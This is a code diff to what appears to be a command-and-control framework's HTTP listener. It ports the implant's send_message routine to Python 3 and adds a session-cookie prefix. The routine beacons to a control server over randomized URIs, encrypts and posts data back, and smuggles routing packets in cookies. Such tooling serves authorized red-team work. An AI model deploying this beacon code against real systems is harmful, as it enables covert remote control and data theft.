@@ -415,50 +415,48 @@ class Listener(object):
 
                 updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
 
-                sendMessage = """
+                sendMessage = f"""
 def send_message(packets=None):
     # Requests a tasking or posts data to a randomized tasking URI.
     # If packets == None, the agent GETs a tasking from the control server.
     # If packets != None, the agent encrypts the passed packets and
     #    POSTs the data to the control server.
-
     global missedCheckins
     global server
     global headers
     global taskURIs
-
     data = None
     if packets:
-        data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, data)
+        encData = aes_encrypt_then_hmac(key, packets)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+
     else:
         # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
         #   meta TASKING_REQUEST = 4
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket)
-        headers['Cookie'] = "session=%s" % (b64routingPacket)
-
+        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
+        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
     taskURI = random.sample(taskURIs, 1)[0]
     requestUri = server + taskURI
 
     try:
-        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
+        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
         return ('200', data)
 
-    except urllib2.HTTPError as HTTPError:
-        # if the server is reached, but returns an erro (like 404)
+    except urllib.request.HTTPError as HTTPError:
+        # if the server is reached, but returns an error (like 404)
         missedCheckins = missedCheckins + 1
         #if signaled for restaging, exit.
         if HTTPError.code == 401:
             sys.exit(0)
 
-    except urllib2.URLError as URLerror:
+        return (HTTPError.code, '')
+
+    except urllib.request.URLError as URLerror:
         # if the server cannot be reached
         missedCheckins = missedCheckins + 1
         return (URLerror.reason, '')
-
     return ('', '')
 """
                 return updateServers + sendMessage
